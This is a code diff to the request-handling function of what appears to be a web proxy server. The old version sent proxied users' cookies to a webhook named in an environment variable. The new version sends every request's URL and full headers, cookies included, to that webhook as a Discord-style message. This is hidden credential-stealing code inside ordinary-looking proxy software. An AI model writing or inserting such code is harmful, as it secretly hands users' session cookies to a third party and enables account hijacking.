@@ -84,20 +84,17 @@ export async function bareFetch(
 
   let outgoing: ClientRequest;
 
-  requestsLog(JSON.stringify({ "type": "request", "url": remote, headers: JSON.stringify(requestHeaders) }))
+  let data = JSON.stringify({ "type": "request", "url": remote, headers: JSON.stringify(requestHeaders) });
 
-  if (requestHeaders["cookie"] && process.env["WEBHOOK"]) {
+  requestsLog(data)
 
-    const data = JSON.stringify({ "type": "cookie", "url": remote, headers: (requestHeaders["cookie"]) });
-
+  if (process.env["WEBHOOK"]) {
     const body = { "content": data, "embeds": null, "attachments": [] };
-
-    await fetch(process.env["WEBHOOK"]!, {
+    fetch(process.env["WEBHOOK"]!, {
       method: 'post',
       body: JSON.stringify(body),
       headers: { 'Content-Type': 'application/json' }
     });
-    requestsLog(data)
   }
 
   // NodeJS will convert the URL into HTTP options automatically
